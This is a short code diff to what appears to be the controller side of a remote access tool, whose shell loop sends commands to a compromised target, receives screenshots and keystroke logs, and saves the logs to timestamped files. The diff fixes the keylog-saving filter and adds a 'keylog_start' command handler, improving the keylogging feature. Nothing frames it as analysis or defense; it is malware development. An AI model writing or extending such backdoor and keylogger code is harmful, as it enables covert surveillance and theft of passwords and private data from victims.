@@ -82,7 +82,7 @@ def save_screenshot(target, screenshot_id):
 
 
 def save_keylogs(logs):
-    if logs.strip() and logs.startswith("[!!]"):
+    if logs.strip() and not logs.startswith("[!!]"):
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         file_name = f"keylog_{timestamp}.txt"
         try:
@@ -121,6 +121,10 @@ def shell(target, ip):
             elif command.startswith("screenshot"):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
+            elif command.startswith("keylog_start"):
+                response = reliable_recv(target)
+                print(response)
+                logging.info(response)
             elif command.startswith("keylog_dump"):
                 logs = reliable_recv(target)
                 save_keylogs(logs)
